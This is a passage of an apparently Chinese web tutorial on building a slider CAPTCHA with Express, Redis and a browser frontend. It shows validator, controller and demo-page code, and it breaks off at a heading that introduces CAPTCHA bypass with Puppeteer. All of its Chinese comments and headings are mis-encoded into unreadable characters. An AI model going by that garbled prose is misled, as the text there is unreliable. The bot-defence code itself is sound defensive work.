      <span class="hljs-keyword">if</span> (timeDiff &gt; <span class="hljs-number">1000</span>) { <span class="hljs-comment">// ç›¸å·®è¶…è¿‡1ç§’ï¼Œå¯èƒ½é€ å‡</span>
        <span class="hljs-keyword">return</span> { <span class="hljs-attr">valid</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">score</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">reason</span>: <span class="hljs-string">'Time mismatch'</span> };
      }
    }

    <span class="hljs-keyword">return</span> { <span class="hljs-attr">valid</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">score</span>: <span class="hljs-number">100</span>, <span class="hljs-attr">details</span>: { <span class="hljs-attr">duration</span>: claimedDuration } };
  }
}

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BehaviorValidator</span>();
</code></pre>
<h4 data-id="heading-25">3. Expressæ§åˆ¶å™¨</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/controllers/captcha.js</span>
<span class="hljs-keyword">const</span> captchaService = <span class="hljs-built_in">require</span>(<span class="hljs-string">'../services/captcha'</span>);
<span class="hljs-keyword">const</span> behaviorValidator = <span class="hljs-built_in">require</span>(<span class="hljs-string">'../services/validator'</span>);
<span class="hljs-keyword">const</span> redis = <span class="hljs-built_in">require</span>(<span class="hljs-string">'../config/redis'</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Joi</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">'joi'</span>);

<span class="hljs-keyword">const</span> verifySchema = <span class="hljs-title class_">Joi</span>.<span class="hljs-title function_">object</span>({
  <span class="hljs-attr">token</span>: <span class="hljs-title class_">Joi</span>.<span class="hljs-title function_">string</span>().required(),
  <span class="hljs-attr">x</span>: <span class="hljs-title class_">Joi</span>.<span class="hljs-title function_">number</span>().required(),
  <span class="hljs-attr">y</span>: <span class="hljs-title class_">Joi</span>.<span class="hljs-title function_">number</span>().required(),
  <span class="hljs-attr">trajectory</span>: <span class="hljs-title class_">Joi</span>.<span class="hljs-title function_">array</span>().<span class="hljs-title function_">items</span>(
    <span class="hljs-title class_">Joi</span>.<span class="hljs-title function_">object</span>({
      <span class="hljs-attr">x</span>: <span class="hljs-title class_">Joi</span>.<span class="hljs-title function_">number</span>().required(),
      <span class="hljs-attr">y</span>: <span class="hljs-title class_">Joi</span>.<span class="hljs-title function_">number</span>().required(),
      <span class="hljs-attr">t</span>: <span class="hljs-title class_">Joi</span>.<span class="hljs-title function_">number</span>().required()
    })
  ).required(),
  <span class="hljs-attr">clientTimestamp</span>: <span class="hljs-title class_">Joi</span>.<span class="hljs-title function_">number</span>().required()
});

<span class="hljs-keyword">class</span> <span class="hljs-title class_">CaptchaController</span> {
  <span class="hljs-comment">// è·å–éªŒè¯ç </span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">getCaptcha</span>(<span class="hljs-params">req, res</span>) {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// é™æµæ£€æŸ¥ï¼ˆå¯é€‰ï¼‰</span>
      <span class="hljs-keyword">const</span> clientIp = req.<span class="hljs-property">ip</span>;
      <span class="hljs-keyword">const</span> rateKey = <span class="hljs-string">`rate:<span class="hljs-subst">${clientIp}</span>`</span>;
      <span class="hljs-keyword">const</span> requestCount = <span class="hljs-keyword">await</span> redis.<span class="hljs-title function_">incr</span>(rateKey);
      <span class="hljs-keyword">if</span> (requestCount === <span class="hljs-number">1</span>) {
        <span class="hljs-keyword">await</span> redis.<span class="hljs-title function_">expire</span>(rateKey, <span class="hljs-number">60</span>); <span class="hljs-comment">// 1åˆ†é’Ÿè¿‡æœŸ</span>
      }
      <span class="hljs-keyword">if</span> (requestCount &gt; <span class="hljs-number">10</span>) {
        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">429</span>).<span class="hljs-title function_">json</span>({ <span class="hljs-attr">error</span>: <span class="hljs-string">'Too many requests'</span> });
      }

      <span class="hljs-keyword">const</span> captcha = <span class="hljs-keyword">await</span> captchaService.<span class="hljs-title function_">generate</span>();
      res.<span class="hljs-title function_">json</span>(captcha);
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Generate captcha error:'</span>, error);
      res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>({ <span class="hljs-attr">error</span>: <span class="hljs-string">'Failed to generate captcha'</span> });
    }
  }

  <span class="hljs-comment">// éªŒè¯éªŒè¯ç </span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">verifyCaptcha</span>(<span class="hljs-params">req, res</span>) {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// å‚æ•°æ ¡éªŒ</span>
      <span class="hljs-keyword">const</span> { error, value } = verifySchema.<span class="hljs-title function_">validate</span>(req.<span class="hljs-property">body</span>);
      <span class="hljs-keyword">if</span> (error) {
        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>({ <span class="hljs-attr">error</span>: error.<span class="hljs-property">details</span>[<span class="hljs-number">0</span>].<span class="hljs-property">message</span> });
      }

      <span class="hljs-keyword">const</span> { token, x, y, trajectory, clientTimestamp } = value;

      <span class="hljs-comment">// è·å–å­˜å‚¨çš„éªŒè¯ç æ•°æ®</span>
      <span class="hljs-keyword">const</span> captchaDataStr = <span class="hljs-keyword">await</span> redis.<span class="hljs-title function_">get</span>(<span class="hljs-string">`captcha:<span class="hljs-subst">${token}</span>`</span>);
      <span class="hljs-keyword">if</span> (!captchaDataStr) {
        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>({ 
          <span class="hljs-attr">valid</span>: <span class="hljs-literal">false</span>, 
          <span class="hljs-attr">error</span>: <span class="hljs-string">'Captcha expired or invalid'</span> 
        });
      }

      <span class="hljs-keyword">const</span> captchaData = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(captchaDataStr);

      <span class="hljs-comment">// æ£€æŸ¥å°è¯•æ¬¡æ•°</span>
      captchaData.<span class="hljs-property">attempts</span> = (captchaData.<span class="hljs-property">attempts</span> || <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>;
      <span class="hljs-keyword">if</span> (captchaData.<span class="hljs-property">attempts</span> &gt; <span class="hljs-number">3</span>) {
        <span class="hljs-keyword">await</span> redis.<span class="hljs-title function_">del</span>(<span class="hljs-string">`captcha:<span class="hljs-subst">${token}</span>`</span>);
        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>({ 
          <span class="hljs-attr">valid</span>: <span class="hljs-literal">false</span>, 
          <span class="hljs-attr">error</span>: <span class="hljs-string">'Too many attempts'</span> 
        });
      }
      <span class="hljs-keyword">await</span> redis.<span class="hljs-title function_">setex</span>(<span class="hljs-string">`captcha:<span class="hljs-subst">${token}</span>`</span>, <span class="hljs-number">300</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(captchaData));

      <span class="hljs-comment">// æ‰§è¡Œç»¼åˆéªŒè¯</span>
      <span class="hljs-keyword">const</span> validationResult = <span class="hljs-keyword">await</span> behaviorValidator.<span class="hljs-title function_">validate</span>(
        trajectory, x, y, captchaData, clientTimestamp
      );

      <span class="hljs-keyword">if</span> (validationResult.<span class="hljs-property">valid</span>) {
        <span class="hljs-comment">// éªŒè¯é€šè¿‡ï¼Œåˆ é™¤tokenå¹¶é¢å‘è®¿é—®token</span>
        <span class="hljs-keyword">await</span> redis.<span class="hljs-title function_">del</span>(<span class="hljs-string">`captcha:<span class="hljs-subst">${token}</span>`</span>);
        
        <span class="hljs-comment">// ç”Ÿæˆä¸´æ—¶è®¿é—®tokenï¼ˆç”¨äºåç»­ä¸šåŠ¡è¯·æ±‚ï¼‰</span>
        <span class="hljs-keyword">const</span> accessToken = <span class="hljs-built_in">require</span>(<span class="hljs-string">'crypto'</span>).<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">32</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">'hex'</span>);
        <span class="hljs-keyword">await</span> redis.<span class="hljs-title function_">setex</span>(<span class="hljs-string">`access:<span class="hljs-subst">${accessToken}</span>`</span>, <span class="hljs-number">600</span>, <span class="hljs-string">'verified'</span>);

        res.<span class="hljs-title function_">json</span>({
          <span class="hljs-attr">valid</span>: <span class="hljs-literal">true</span>,
          <span class="hljs-attr">score</span>: validationResult.<span class="hljs-property">score</span>,
          accessToken
        });
      } <span class="hljs-keyword">else</span> {
        res.<span class="hljs-title function_">json</span>({
          <span class="hljs-attr">valid</span>: <span class="hljs-literal">false</span>,
          <span class="hljs-attr">score</span>: validationResult.<span class="hljs-property">score</span>,
          <span class="hljs-attr">reason</span>: validationResult.<span class="hljs-property">details</span>,
          <span class="hljs-attr">remainingAttempts</span>: <span class="hljs-number">3</span> - captchaData.<span class="hljs-property">attempts</span>
        });
      }
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Verify captcha error:'</span>, error);
      res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>({ <span class="hljs-attr">error</span>: <span class="hljs-string">'Verification failed'</span> });
    }
  }
}

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CaptchaController</span>();
</code></pre>
<h4 data-id="heading-26">4. å‰ç«¯é›†æˆç¤ºä¾‹</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>æ»‘å—éªŒè¯ç æ¼”ç¤º<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
        <span class="hljs-selector-class">.captcha-container</span> {
            <span class="hljs-attribute">position</span>: relative;
            <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;
            <span class="hljs-attribute">margin</span>: <span class="hljs-number">50px</span> auto;
            user-select: none;
        }
        <span class="hljs-selector-class">.captcha-bg</span> {
            <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;
            <span class="hljs-attribute">height</span>: <span class="hljs-number">150px</span>;
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
        }
        <span class="hljs-selector-class">.slider-track</span> {
            <span class="hljs-attribute">position</span>: relative;
            <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;
            <span class="hljs-attribute">height</span>: <span class="hljs-number">40px</span>;
            <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">10px</span>;
            <span class="hljs-attribute">background</span>: <span class="hljs-number">#e0e0e0</span>;
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">20px</span>;
        }
        <span class="hljs-selector-class">.slider-btn</span> {
            <span class="hljs-attribute">position</span>: absolute;
            <span class="hljs-attribute">left</span>: <span class="hljs-number">0</span>;
            <span class="hljs-attribute">top</span>: <span class="hljs-number">0</span>;
            <span class="hljs-attribute">width</span>: <span class="hljs-number">40px</span>;
            <span class="hljs-attribute">height</span>: <span class="hljs-number">40px</span>;
            <span class="hljs-attribute">background</span>: <span class="hljs-number">#fff</span>;
            <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ccc</span>;
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;
            <span class="hljs-attribute">cursor</span>: pointer;
            <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">4px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>);
            <span class="hljs-attribute">display</span>: flex;
            <span class="hljs-attribute">align-items</span>: center;
            <span class="hljs-attribute">justify-content</span>: center;
        }
        <span class="hljs-selector-class">.slider-btn</span><span class="hljs-selector-pseudo">::before</span> {
            <span class="hljs-attribute">content</span>: <span class="hljs-string">'â†’'</span>;
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">18px</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#666</span>;
        }
        <span class="hljs-selector-class">.slider-text</span> {
            <span class="hljs-attribute">position</span>: absolute;
            <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;
            <span class="hljs-attribute">top</span>: <span class="hljs-number">50%</span>;
            <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate</span>(-<span class="hljs-number">50%</span>, -<span class="hljs-number">50%</span>);
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#999</span>;
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;
        }
        <span class="hljs-selector-class">.success</span> {
            <span class="hljs-attribute">background</span>: <span class="hljs-number">#52c41a</span> <span class="hljs-meta">!important</span>;
            <span class="hljs-attribute">border-color</span>: <span class="hljs-number">#52c41a</span> <span class="hljs-meta">!important</span>;
        }
        <span class="hljs-selector-class">.success</span><span class="hljs-selector-pseudo">::before</span> {
            <span class="hljs-attribute">content</span>: <span class="hljs-string">'âœ“'</span>;
            <span class="hljs-attribute">color</span>: white;
        }
        <span class="hljs-selector-class">.failed</span> {
            <span class="hljs-attribute">background</span>: <span class="hljs-number">#ff4d4f</span> <span class="hljs-meta">!important</span>;
            <span class="hljs-attribute">border-color</span>: <span class="hljs-number">#ff4d4f</span> <span class="hljs-meta">!important</span>;
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"captcha-container"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"bgImage"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"captcha-bg"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"éªŒè¯ç èƒŒæ™¯"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"slider-track"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"sliderBtn"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"slider-btn"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"slider-text"</span>&gt;</span>æ‹–åŠ¨æ»‘å—å®ŒæˆéªŒè¯<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
        <span class="hljs-keyword">class</span> <span class="hljs-title class_">SliderCaptcha</span> {
            <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">token</span> = <span class="hljs-literal">null</span>;
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">trajectory</span> = [];
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">startTime</span> = <span class="hljs-literal">null</span>;
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">isDragging</span> = <span class="hljs-literal">false</span>;
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderBtn</span> = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'sliderBtn'</span>);
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">bgImage</span> = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'bgImage'</span>);
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">trackWidth</span> = <span class="hljs-number">260</span>; <span class="hljs-comment">// å¯æ‹–åŠ¨èŒƒå›´</span>
                
                <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">init</span>();
            }

            <span class="hljs-keyword">async</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
                <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">loadCaptcha</span>();
                <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">bindEvents</span>();
            }

            <span class="hljs-keyword">async</span> <span class="hljs-title function_">loadCaptcha</span>(<span class="hljs-params"/>) {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/captcha'</span>);
                    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
                    
                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">token</span> = data.<span class="hljs-property">token</span>;
                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">bgImage</span>.<span class="hljs-property">src</span> = <span class="hljs-string">`data:image/png;base64,<span class="hljs-subst">${data.bgImage}</span>`</span>;
                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderData</span> = data;
                } <span class="hljs-keyword">catch</span> (error) {
                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Failed to load captcha:'</span>, error);
                }
            }

            <span class="hljs-title function_">bindEvents</span>(<span class="hljs-params"/>) {
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderBtn</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mousedown'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">onDragStart</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>));
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mousemove'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">onDragMove</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>));
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mouseup'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">onDragEnd</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>));

                <span class="hljs-comment">// ç§»åŠ¨ç«¯è§¦æ‘¸äº‹ä»¶</span>
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderBtn</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'touchstart'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">onDragStart</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>));
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'touchmove'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">onDragMove</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>));
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'touchend'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">onDragEnd</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>));
            }

            <span class="hljs-title function_">onDragStart</span>(<span class="hljs-params">e</span>) {
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">isDragging</span> = <span class="hljs-literal">true</span>;
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">startTime</span> = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">trajectory</span> = [];
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">startX</span> = e.<span class="hljs-property">type</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'touch'</span>) ? e.<span class="hljs-property">touches</span>[<span class="hljs-number">0</span>].<span class="hljs-property">clientX</span> : e.<span class="hljs-property">clientX</span>;
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderStartLeft</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderBtn</span>.<span class="hljs-property">offsetLeft</span>;
            }

            <span class="hljs-title function_">onDragMove</span>(<span class="hljs-params">e</span>) {
                <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">isDragging</span>) <span class="hljs-keyword">return</span>;

                <span class="hljs-keyword">const</span> clientX = e.<span class="hljs-property">type</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'touch'</span>) ? e.<span class="hljs-property">touches</span>[<span class="hljs-number">0</span>].<span class="hljs-property">clientX</span> : e.<span class="hljs-property">clientX</span>;
                <span class="hljs-keyword">const</span> deltaX = clientX - <span class="hljs-variable language_">this</span>.<span class="hljs-property">startX</span>;
                <span class="hljs-keyword">let</span> newLeft = <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderStartLeft</span> + deltaX;

                <span class="hljs-comment">// é™åˆ¶èŒƒå›´</span>
                newLeft = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(newLeft, <span class="hljs-variable language_">this</span>.<span class="hljs-property">trackWidth</span>));
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderBtn</span>.<span class="hljs-property">style</span>.<span class="hljs-property">left</span> = newLeft + <span class="hljs-string">'px'</span>;

                <span class="hljs-comment">// è®°å½•è½¨è¿¹ç‚¹</span>
                <span class="hljs-keyword">const</span> timestamp = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - <span class="hljs-variable language_">this</span>.<span class="hljs-property">startTime</span>;
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">trajectory</span>.<span class="hljs-title function_">push</span>({
                    <span class="hljs-attr">x</span>: newLeft,
                    <span class="hljs-attr">y</span>: <span class="hljs-number">0</span>, <span class="hljs-comment">// ç®€åŒ–å¤„ç†ï¼Œå‡è®¾Yä¸å˜</span>
                    <span class="hljs-attr">t</span>: timestamp
                });
            }

            <span class="hljs-keyword">async</span> <span class="hljs-title function_">onDragEnd</span>(<span class="hljs-params">e</span>) {
                <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">isDragging</span>) <span class="hljs-keyword">return</span>;
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">isDragging</span> = <span class="hljs-literal">false</span>;

                <span class="hljs-keyword">const</span> finalX = <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderBtn</span>.<span class="hljs-property">offsetLeft</span>;
                <span class="hljs-keyword">const</span> finalY = <span class="hljs-number">0</span>;

                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/captcha/verify'</span>, {
                        <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
                        <span class="hljs-attr">headers</span>: { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span> },
                        <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
                            <span class="hljs-attr">token</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">token</span>,
                            <span class="hljs-attr">x</span>: finalX,
                            <span class="hljs-attr">y</span>: finalY,
                            <span class="hljs-attr">trajectory</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">trajectory</span>,
                            <span class="hljs-attr">clientTimestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()
                        })
                    });

                    <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
                    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleResult</span>(result);
                } <span class="hljs-keyword">catch</span> (error) {
                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Verification failed:'</span>, error);
                    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">reset</span>();
                }
            }

            <span class="hljs-title function_">handleResult</span>(<span class="hljs-params">result</span>) {
                <span class="hljs-keyword">if</span> (result.<span class="hljs-property">valid</span>) {
                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderBtn</span>.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'success'</span>);
                    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.slider-text'</span>).<span class="hljs-property">textContent</span> = <span class="hljs-string">'éªŒè¯æˆåŠŸ'</span>;
                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'éªŒè¯é€šè¿‡ï¼Œå¾—åˆ†:'</span>, result.<span class="hljs-property">score</span>);
                    
                    <span class="hljs-comment">// å¯ä»¥åœ¨è¿™é‡Œè§¦å‘åç»­ä¸šåŠ¡é€»è¾‘</span>
                    <span class="hljs-keyword">if</span> (result.<span class="hljs-property">accessToken</span>) {
                        <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'captchaToken'</span>, result.<span class="hljs-property">accessToken</span>);
                    }
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderBtn</span>.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'failed'</span>);
                    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.slider-text'</span>).<span class="hljs-property">textContent</span> = 
                        <span class="hljs-string">`éªŒè¯å¤±è´¥ï¼Œè¿˜å‰©<span class="hljs-subst">${result.remainingAttempts || <span class="hljs-number">0</span>}</span>æ¬¡æœºä¼š`</span>;
                    
                    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
                        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">reset</span>();
                    }, <span class="hljs-number">1500</span>);
                }
            }

            <span class="hljs-title function_">reset</span>(<span class="hljs-params"/>) {
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderBtn</span>.<span class="hljs-property">style</span>.<span class="hljs-property">left</span> = <span class="hljs-string">'0px'</span>;
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderBtn</span>.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'success'</span>, <span class="hljs-string">'failed'</span>);
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.slider-text'</span>).<span class="hljs-property">textContent</span> = <span class="hljs-string">'æ‹–åŠ¨æ»‘å—å®ŒæˆéªŒè¯'</span>;
                <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">loadCaptcha</span>(); <span class="hljs-comment">// é‡æ–°åŠ è½½éªŒè¯ç </span>
            }
        }

        <span class="hljs-comment">// åˆå§‹åŒ–</span>
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">SliderCaptcha</span>();
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h3 data-id="heading-27">éƒ¨ç½²è¿è¡Œ</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. å®‰è£…ä¾èµ–</span>
npm install express redis canvas joi

<span class="hljs-comment"># 2. å¯åŠ¨Redis</span>
redis-server

<span class="hljs-comment"># 3. å¯åŠ¨æœåŠ¡</span>
node src/app.js

<span class="hljs-comment"># 4. è®¿é—®æµ‹è¯•</span>
open http://localhost:3000
</code></pre>
<h2 data-id="heading-28">ç»•è¿‡ä¸ååˆ¶ï¼šæ”»é˜²å®æˆ˜</h2>
<p>è¯´äº†é‚£ä¹ˆå¤šé˜²å¾¡ï¼Œæˆ‘ä»¬ä¹Ÿæ¥çœ‹çœ‹æ”»å‡»è€…æ˜¯æ€ä¹ˆæƒ³çš„ã€‚çŸ¥å·±çŸ¥å½¼ï¼Œæ‰èƒ½ç™¾æˆ˜ä¸æ®†ã€‚</p>
<h3 data-id="heading-29">å¸¸è§çš„ç»•è¿‡æ–¹æ¡ˆ</h3>
<h4 data-id="heading-30">1. Puppeteerè‡ªåŠ¨åŒ–ç ´è§£</h4>
